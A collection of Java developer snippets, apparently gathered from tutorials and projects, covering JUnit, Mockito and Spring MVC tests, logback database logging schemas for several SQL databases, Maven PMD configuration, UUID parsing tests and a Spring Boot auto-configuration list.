        assertEquals(new Link(page.travelModuleLinkElement), travelModuleLink);
        assertEquals(new Link(page.photoModuleLinkElement), photoModuleLink);
    }

    @Test
    public void modules() {
        assertEquals(new Module(page.readingModuleElement), readingModule);
        assertEquals(new Module(page.travelModuleElement), travelModule);
        assertEquals(new Module(page.photoModuleElement), photoModule);
    }
}
--------------------------------------------------------------------------------------------------------
# mssql
DROP TABLE logging_event_property 
DROP TABLE logging_event_exception 
DROP TABLE logging_event 

CREATE TABLE logging_event 
  ( 
    timestmp         DECIMAL(20) NOT NULL,
   	formatted_message  VARCHAR(4000) NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          DECIMAL(40) NOT NULL identity,
    PRIMARY KEY(event_id) 
  ) 

CREATE TABLE logging_event_property 
  ( 
    event_id          DECIMAL(40) NOT NULL, 
    mapped_key        VARCHAR(254) NOT NULL, 
    mapped_value      VARCHAR(1024), 
    PRIMARY KEY(event_id, mapped_key), 
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id) 
  ) 

CREATE TABLE logging_event_exception 
  ( 
    event_id         DECIMAL(40) NOT NULL, 
    i                SMALLINT NOT NULL, 
    trace_line       VARCHAR(254) NOT NULL, 
    PRIMARY KEY(event_id, i), 
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id) 
  ) 
  
# hsqldb
DROP TABLE logging_event_exception IF EXISTS;
DROP TABLE logging_event_property IF EXISTS;
DROP TABLE logging_event IF EXISTS;

CREATE TABLE logging_event (
  timestmp BIGINT NOT NULL,
  formatted_message LONGVARCHAR NOT NULL,
  logger_name VARCHAR(256) NOT NULL,
  level_string VARCHAR(256) NOT NULL,
  thread_name VARCHAR(256),
  reference_flag SMALLINT,
  arg0 VARCHAR(256),
  arg1 VARCHAR(256),
  arg2 VARCHAR(256),
  arg3 VARCHAR(256),
  caller_filename VARCHAR(256), 
  caller_class VARCHAR(256), 
  caller_method VARCHAR(256), 
  caller_line CHAR(4),
  event_id BIGINT NOT NULL IDENTITY);


CREATE TABLE logging_event_property (
  event_id BIGINT NOT NULL,
  mapped_key  VARCHAR(254) NOT NULL,
  mapped_value LONGVARCHAR,
  PRIMARY KEY(event_id, mapped_key),
  FOREIGN KEY (event_id) REFERENCES logging_event(event_id));

CREATE TABLE logging_event_exception (
  event_id BIGINT NOT NULL,
  i SMALLINT NOT NULL,
  trace_line VARCHAR(256) NOT NULL,
  PRIMARY KEY(event_id, i),
  FOREIGN KEY (event_id) REFERENCES logging_event(event_id));
  
# h2
DROP TABLE logging_event_exception IF EXISTS;
DROP TABLE logging_event_property IF EXISTS;
DROP TABLE logging_event IF EXISTS;

CREATE TABLE logging_event (
  timestmp BIGINT NOT NULL,
  formatted_message LONGVARCHAR NOT NULL,
  logger_name VARCHAR(256) NOT NULL,
  level_string VARCHAR(256) NOT NULL,
  thread_name VARCHAR(256),
  reference_flag SMALLINT,
  arg0 VARCHAR(256),
  arg1 VARCHAR(256),
  arg2 VARCHAR(256),
  arg3 VARCHAR(256),
  caller_filename VARCHAR(256), 
  caller_class VARCHAR(256), 
  caller_method VARCHAR(256), 
  caller_line CHAR(4),
  event_id IDENTITY NOT NULL);


CREATE TABLE logging_event_property (
  event_id BIGINT NOT NULL,
  mapped_key  VARCHAR(254) NOT NULL,
  mapped_value LONGVARCHAR,
  PRIMARY KEY(event_id, mapped_key),
  FOREIGN KEY (event_id) REFERENCES logging_event(event_id));

CREATE TABLE logging_event_exception (
  event_id BIGINT NOT NULL,
  i SMALLINT NOT NULL,
  trace_line VARCHAR(256) NOT NULL,
  PRIMARY KEY(event_id, i),
  FOREIGN KEY (event_id) REFERENCES logging_event(event_id));

# db2
DROP TABLE  logging_event_property;
DROP TABLE  logging_event_exception;
DROP TABLE  logging_event;

CREATE TABLE logging_event 
  (
    timestmp          BIGINT NOT NULL,
   	formatted_message VARCHAR(4000) NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id           INTEGER GENERATED ALWAYS AS IDENTITY (START WITH 1)
  );

CREATE TABLE logging_event_property
  (
    event_id	      INTEGER NOT NULL,
    mapped_key        VARCHAR(254) NOT NULL,
    mapped_value      VARCHAR(1024),
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );

CREATE TABLE logging_event_exception
  (
    event_id         INTEGER NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );

# mysql
BEGIN;
DROP TABLE IF EXISTS logging_event_property;
DROP TABLE IF EXISTS logging_event_exception;
DROP TABLE IF EXISTS logging_event;
COMMIT;


BEGIN;
CREATE TABLE logging_event 
  (
    timestmp         BIGINT NOT NULL,
    formatted_message  TEXT NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY
  );
COMMIT;

BEGIN;
CREATE TABLE logging_event_property
  (
    event_id	      BIGINT NOT NULL,
    mapped_key        VARCHAR(254) NOT NULL,
    mapped_value      TEXT,
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
COMMIT;

BEGIN;
CREATE TABLE logging_event_exception
  (
    event_id         BIGINT NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
COMMIT;

# oracle
CREATE SEQUENCE logging_event_id_seq MINVALUE 1 START WITH 1;

CREATE TABLE logging_event 
  (
    timestmp         NUMBER(20) NOT NULL,
    formatted_message  VARCHAR2(4000) NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          NUMBER(10) PRIMARY KEY
  );


-- the / suffix may or may not be needed depending on your SQL Client
-- Some SQL Clients, e.g. SQuirrel SQL has trouble with the following
-- trigger creation command, while SQLPlus (the basic SQL Client which
-- ships with Oracle) has no trouble at all.

CREATE TRIGGER logging_event_id_seq_trig
  BEFORE INSERT ON logging_event
  FOR EACH ROW  
  BEGIN  
    SELECT logging_event_id_seq.NEXTVAL 
    INTO   :NEW.event_id 
    FROM   DUAL;  
  END;
/


CREATE TABLE logging_event_property
  (
    event_id	      NUMBER(10) NOT NULL,
    mapped_key        VARCHAR2(254) NOT NULL,
    mapped_value      VARCHAR2(1024),
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
  
CREATE TABLE logging_event_exception
  (
    event_id         NUMBER(10) NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR2(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
  
# postgresql
DROP TABLE    logging_event_property;
DROP TABLE    logging_event_exception;
DROP TABLE    logging_event;
DROP SEQUENCE logging_event_id_seq;


CREATE SEQUENCE logging_event_id_seq MINVALUE 1 START 1;


CREATE TABLE logging_event 
  (
    timestmp         BIGINT NOT NULL,
    formatted_message  TEXT NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          BIGINT DEFAULT nextval('logging_event_id_seq') PRIMARY KEY
  );

CREATE TABLE logging_event_property
  (
    event_id	      BIGINT NOT NULL,
    mapped_key        VARCHAR(254) NOT NULL,
    mapped_value      VARCHAR(1024),
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );

CREATE TABLE logging_event_exception
  (
    event_id         BIGINT NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );

# sqllite
BEGIN;
DROP TABLE IF EXISTS logging_event_property;
DROP TABLE IF EXISTS logging_event_exception;
DROP TABLE IF EXISTS logging_event;
COMMIT;


BEGIN;
CREATE TABLE logging_event
  (
    timestmp         BIGINT NOT NULL,
    formatted_message  TEXT NOT NULL,
    logger_name       VARCHAR(254) NOT NULL,
    level_string      VARCHAR(254) NOT NULL,
    thread_name       VARCHAR(254),
    reference_flag    SMALLINT,
    arg0              VARCHAR(254),
    arg1              VARCHAR(254),
    arg2              VARCHAR(254),
    arg3              VARCHAR(254),
    caller_filename   VARCHAR(254) NOT NULL,
    caller_class      VARCHAR(254) NOT NULL,
    caller_method     VARCHAR(254) NOT NULL,
    caller_line       CHAR(4) NOT NULL,
    event_id          INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT
  );
COMMIT;

BEGIN;
CREATE TABLE logging_event_property
  (
    event_id	      BIGINT NOT NULL,
    mapped_key        VARCHAR(254) NOT NULL,
    mapped_value      TEXT,
    PRIMARY KEY(event_id, mapped_key),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
COMMIT;

BEGIN;
CREATE TABLE logging_event_exception
  (
    event_id         BIGINT NOT NULL,
    i                SMALLINT NOT NULL,
    trace_line       VARCHAR(254) NOT NULL,
    PRIMARY KEY(event_id, i),
    FOREIGN KEY (event_id) REFERENCES logging_event(event_id)
  );
COMMIT;

# sybase
DROP TABLE logging_event_property 
DROP TABLE logging_event_exception 
DROP TABLE logging_event 

CREATE TABLE logging_event 
( 
  timestmp         bigint NOT NULL,
  formatted_message  LONG VARCHAR NOT NULL,
  logger_name       VARCHAR(254) NOT NULL,
  level_string      VARCHAR(254) NOT NULL,
  thread_name       VARCHAR(254),
  reference_flag    SMALLINT,
  arg0              VARCHAR(254),
  arg1              VARCHAR(254),
  arg2              VARCHAR(254),
  arg3              VARCHAR(254),  
  caller_filename   VARCHAR(254) NOT NULL,
  caller_class      VARCHAR(254) NOT NULL,
  caller_method     VARCHAR(254) NOT NULL,
  caller_line       varCHAR(4) NOT NULL,
  event_id          int NOT NULL DEFAULT AUTOINCREMENT,
  PRIMARY KEY(event_id) 
) 			

CREATE TABLE logging_event_property 
  ( 
	event_id          int NOT NULL REFERENCES logging_event(event_id), 
	mapped_key        VARCHAR(254) NOT NULL, 
	mapped_value      LONG VARCHAR, 
	PRIMARY KEY(event_id, mapped_key) 
  ) 

CREATE TABLE logging_event_exception 
  ( 
	event_id         int NOT NULL REFERENCES logging_event(event_id) , 
	i                SMALLINT NOT NULL, 
	trace_line       VARCHAR(254) NOT NULL, 
	PRIMARY KEY(event_id, i) 
  )
--------------------------------------------------------------------------------------------------------
  public Platform getPlatform() {
    return Stream.of("platform", "platformName")
        .map(this::getCapability)
        .filter(Objects::nonNull)
        .map(cap -> {
          if (cap instanceof Platform) {
            return (Platform) cap;
          }

          try {
            return Platform.fromString((String.valueOf(cap)));
          } catch (WebDriverException e) {
            return null;
          }
        })
        .filter(Objects::nonNull)
        .findFirst()
        .orElse(null);
  }
--------------------------------------------------------------------------------------------------------
                <plugin>
                    <groupId>org.apache.maven.plugins</groupId>
                    <artifactId>maven-pmd-plugin</artifactId>
                    <version>3.6</version>
                    <configuration>
                        <failOnViolation>true</failOnViolation>
                        <excludeRoots>
                            <excludeRoot>target/generated-sources/plugin</excludeRoot>
                        </excludeRoots>
                        <excludes>
                            <exclude>**/HelpMojo.java</exclude>
                        </excludes>
                    </configuration>
                    <executions>
                        <execution>
                            <goals>
                                <goal>check</goal>
                                <goal>cpd-check</goal>
                            </goals>
                            <configuration>
                                <failOnViolation>true</failOnViolation>
                                <excludes>
                                    <exclude>**/HelpMojo.java</exclude>
                                </excludes>
                            </configuration>
                        </execution>
                    </executions>
                </plugin>
--------------------------------------------------------------------------------------------------------
@TestPropertySource(properties = { "spring.config.location = classpath:<path-to-your-yml-file>" }

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-configuration-processor</artifactId>
        </dependency>
--------------------------------------------------------------------------------------------------------
import org.testng.annotations.Test;

public class ReplaceAllTest {

    @Test
    public void replaceAllExamples() {
        String complexString = "3ifhuq023hjk@jka$ksoap";
        String withWhiteSpacesString = "This is a string\n " +
                "that streches on several lines.\n" +
                "to demo how to remove whitespaces and newlines\n " +
                "from a\n" +
                "string\n";
        String phraseString = "This is just a phrase String.";
        //removing all alphabetical characters from a string
        System.out.println(complexString.replaceAll("\\D", ""));
        //removing all numeric characters from a string
        System.out.println(complexString.replaceAll("\\d", ""));

        //output of what the string with newlines looks like on the console
        System.out.println("String with new line characters before replace: " + withWhiteSpacesString);
        //removing the new lines from the string
        System.out.println("String with new line characters before replacing new lines: " + withWhiteSpacesString
                .replaceAll("\n", ""));
        //removing all whitespace characters from string (including new line, space)
        System.out.println("String with new line characters before replacing all white space: " + withWhiteSpacesString
                .replaceAll("\\s", ""));

        System.out.println("String whose small a letters became capital letter: " + phraseString.replaceAll
                ("a", "A"));
        System.out.println("String whose small a letters became capital letter: " + complexString.replaceAll
                ("\\d", " "));
        System.out.println(complexString.replaceAll("jk", "_"));
    }
}
--------------------------------------------------------------------------------------------------------
import static org.mockito.Mockito.*;
import static org.junit.Assert.*;

@Test
public void test1()  {
        //  create mock
        MyClass test = mock(MyClass.class);

        // define return value for method getUniqueId()
        when(test.getUniqueId()).thenReturn(43);

        // use mock in test....
        assertEquals(test.getUniqueId(), 43);
}


// demonstrates the return of multiple values
@Test
public void testMoreThanOneReturnValue()  {
        Iterator<String> i= mock(Iterator.class);
        when(i.next()).thenReturn("Mockito").thenReturn("rocks");
        String result= i.next()+" "+i.next();
        //assert
        assertEquals("Mockito rocks", result);
}

// this test demonstrates how to return values based on the input
@Test
public void testReturnValueDependentOnMethodParameter()  {
        Comparable<String> c= mock(Comparable.class);
        when(c.compareTo("Mockito")).thenReturn(1);
        when(c.compareTo("Eclipse")).thenReturn(2);
        //assert
        assertEquals(1, c.compareTo("Mockito"));
}

// this test demonstrates how to return values independent of the input value

@Test
public void testReturnValueInDependentOnMethodParameter()  {
        Comparable<Integer> c= mock(Comparable.class);
        when(c.compareTo(anyInt())).thenReturn(-1);
        //assert
        assertEquals(-1, c.compareTo(9));
}

// return a value based on the type of the provide parameter

@Test
public void testReturnValueInDependentOnMethodParameter2()  {
        Comparable<Todo> c= mock(Comparable.class);
        when(c.compareTo(isA(Todo.class))).thenReturn(0);
        //assert
        assertEquals(0, c.compareTo(new Todo(1)));
}
--------------------------------------------------------------------------------------------------------
@EnableWebMvc
@ComponentScan("io.github.d2edev.mywebapp.web")
public class WebDispatcherConfig extends WebMvcConfigurerAdapter {
public static final String WEBAPP_PREFIX="/web";
public static final String PREFIX_NAME="wepbrefix";

@Bean
public ViewResolver viewResolver() {
    InternalResourceViewResolver resolver = new InternalResourceViewResolver();
    resolver.setPrefix("/WEB-INF/jsp/");
    resolver.setSuffix(".jsp");
    resolver.setExposeContextBeansAsAttributes(true);
    return resolver;
}



@Override
public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) {
    configurer.enable();
}

@Override
public void addResourceHandlers(ResourceHandlerRegistry registry) {
    registry.addResourceHandler("/resources/**").addResourceLocations("/resources/");
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes={WebDispatcherConfig.class,DataConfig.class})
@WebAppConfiguration
public class HomeControllerTest {

private MockMvc mockMvc;

@Autowired
private WebApplicationContext wac ;

@Before
public void setUp() {
    this.mockMvc = webAppContextSetup(wac).build();
    System.out.println(Arrays.toString(wac.getBeanDefinitionNames()));

}

@Test
public void testHome() throws Exception {


    mockMvc
    .perform(get(WebDispatcherConfig.WEBAPP_PREFIX))
    .andExpect(view().name(HomeController.HOME))
    .andExpect(model().attributeExists(WebDispatcherConfig.PREFIX_NAME));
}

}
--------------------------------------------------------------------------------------------------------
## Let’s generate a unique key using ‘SHA-256’ and a random UUID:

MessageDigest salt = MessageDigest.getInstance("SHA-256");
salt.update(UUID.randomUUID().toString().getBytes("UTF-8"));
String digest = bytesToHex(salt.digest());
--------------------------------------------------------------------------------------------------------
Case-1: Few junk characters
@Test
public void testUUIDFormat_JunkCharacters()
{
    String uuidInStr = "abc";
    UUID uuid = UUID.fromString(uuidInStr);
}
This test will result an exception: java.lang.IllegalArgumentException: Invalid UUID string: abc
    at java.util.UUID.fromString(UUID.java:194)

Case-2: Valid UUID
@Test
public void testUUIDFormat_ProperFormat()
{
    String uuidInStr = "3dd4fa6e-2899-4429-b818-d34fe8df5dd0";
    UUID uuid = UUID.fromString(uuidInStr);
    Assert.assertEquals(uuidInStr, uuid.toString());
    System.out.println(uuid);
}
If you pass a valid UUID, it works fine.

Case-3: Few characters missing in 1st & 5th group
@Test
public void testUUIDFormat_MissingCharacters()
{
    String uuidInStr = "3dd4fa-2899-4429-b818-d34fe8df5d";
    UUID uuid = UUID.fromString(uuidInStr);
    System.out.println(uuid);
    Assert.assertEquals(uuidInStr, uuid.toString());
}
If you observe, resulted string was “003dd4fa-2899-4429-b818-00d34fe8df5d”; 0’s added at the beginning. So when you compare, it fails the test case.

Case-4: Few extra characters in 1st & 5th group
@Test
public void testUUIDFormat_MoreCharacters()
{
    String uuidInStr = "3dd5ee1234-2899-4429-b818-d34fe8df5ee123";
    UUID uuid = UUID.fromString(uuidInStr);
    System.out.println(uuid);
    Assert.assertEquals(uuidInStr, uuid.toString());
} 
--------------------------------------------------------------------------------------------------------
# Initializers
org.springframework.context.ApplicationContextInitializer=\
org.springframework.boot.autoconfigure.SharedMetadataReaderFactoryContextInitializer,\
org.springframework.boot.autoconfigure.logging.ConditionEvaluationReportLoggingListener

# Application Listeners
org.springframework.context.ApplicationListener=\
org.springframework.boot.autoconfigure.BackgroundPreinitializer

# Auto Configuration Import Listeners
org.springframework.boot.autoconfigure.AutoConfigurationImportListener=\
org.springframework.boot.autoconfigure.condition.ConditionEvaluationReportAutoConfigurationImportListener

# Auto Configuration Import Filters
org.springframework.boot.autoconfigure.AutoConfigurationImportFilter=\
org.springframework.boot.autoconfigure.condition.OnBeanCondition,\
org.springframework.boot.autoconfigure.condition.OnClassCondition,\
org.springframework.boot.autoconfigure.condition.OnWebApplicationCondition

# Auto Configure
org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\
org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\
org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\
org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\
org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\
org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\
org.springframework.boot.autoconfigure.cloud.CloudServiceConnectorsAutoConfiguration,\
org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\
org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration,\
org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\
org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration,\
org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\
org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.cassandra.CassandraReactiveDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.cassandra.CassandraReactiveRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.couchbase.CouchbaseReactiveDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.couchbase.CouchbaseReactiveRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchAutoConfiguration,\
org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.jdbc.JdbcRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.mongo.MongoReactiveDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.mongo.MongoReactiveRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\
org.springframework.boot.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,\
org.springframework.boot.autoconfigure.data.redis.RedisReactiveAutoConfiguration,\
org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\
org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\
org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration,\
org.springframework.boot.autoconfigure.elasticsearch.jest.JestAutoConfiguration,\
org.springframework.boot.autoconfigure.elasticsearch.rest.RestClientAutoConfiguration,\
org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration,\
org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\
org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration,\
org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration,\
org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration,\
org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration,\
org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\
org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration,\
org.springframework.boot.autoconfigure.http.codec.CodecsAutoConfiguration,\
org.springframework.boot.autoconfigure.influx.InfluxDbAutoConfiguration,\
org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration,\
org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration,\
org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration,\
org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\
org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\
org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\
org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration,\
org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\
org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration,\
org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration,\
org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\
org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\
org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\
org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\
org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration,\
org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration,\
org.springframework.boot.autoconfigure.jsonb.JsonbAutoConfiguration,\
org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration,\
org.springframework.boot.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\
org.springframework.boot.autoconfigure.ldap.LdapAutoConfiguration,\
org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration,\
org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration,\
org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\
org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\
org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration,\
org.springframework.boot.autoconfigure.mongo.MongoReactiveAutoConfiguration,\
org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration,\
org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\
org.springframework.boot.autoconfigure.quartz.QuartzAutoConfiguration,\
org.springframework.boot.autoconfigure.reactor.core.ReactorCoreAutoConfiguration,\
org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration,\
org.springframework.boot.autoconfigure.security.servlet.SecurityRequestMatcherProviderAutoConfiguration,\
org.springframework.boot.autoconfigure.security.servlet.UserDetailsServiceAutoConfiguration,\
org.springframework.boot.autoconfigure.security.servlet.SecurityFilterAutoConfiguration,\
org.springframework.boot.autoconfigure.security.reactive.ReactiveSecurityAutoConfiguration,\
org.springframework.boot.autoconfigure.security.reactive.ReactiveUserDetailsServiceAutoConfiguration,\
org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration,\
org.springframework.boot.autoconfigure.session.SessionAutoConfiguration,\
org.springframework.boot.autoconfigure.security.oauth2.client.servlet.OAuth2ClientAutoConfiguration,\
org.springframework.boot.autoconfigure.security.oauth2.client.reactive.ReactiveOAuth2ClientAutoConfiguration,\
org.springframework.boot.autoconfigure.security.oauth2.resource.servlet.OAuth2ResourceServerAutoConfiguration,\
org.springframework.boot.autoconfigure.security.oauth2.resource.reactive.ReactiveOAuth2ResourceServerAutoConfiguration,\
org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration,\
org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration,\
org.springframework.boot.autoconfigure.task.TaskSchedulingAutoConfiguration,\
org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\
org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration,\
org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration,\
org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration,\
org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration,\
org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.HttpHandlerAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.ReactiveWebServerFactoryAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.WebFluxAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.error.ErrorWebFluxAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.function.client.ClientHttpConnectorAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.function.client.WebClientAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.HttpEncodingAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration,\
org.springframework.boot.autoconfigure.websocket.reactive.WebSocketReactiveAutoConfiguration,\
org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration,\
org.springframework.boot.autoconfigure.websocket.servlet.WebSocketMessagingAutoConfiguration,\
org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration,\
org.springframework.boot.autoconfigure.webservices.client.WebServiceTemplateAutoConfiguration

# Failure analyzers
org.springframework.boot.diagnostics.FailureAnalyzer=\
org.springframework.boot.autoconfigure.diagnostics.analyzer.NoSuchBeanDefinitionFailureAnalyzer,\
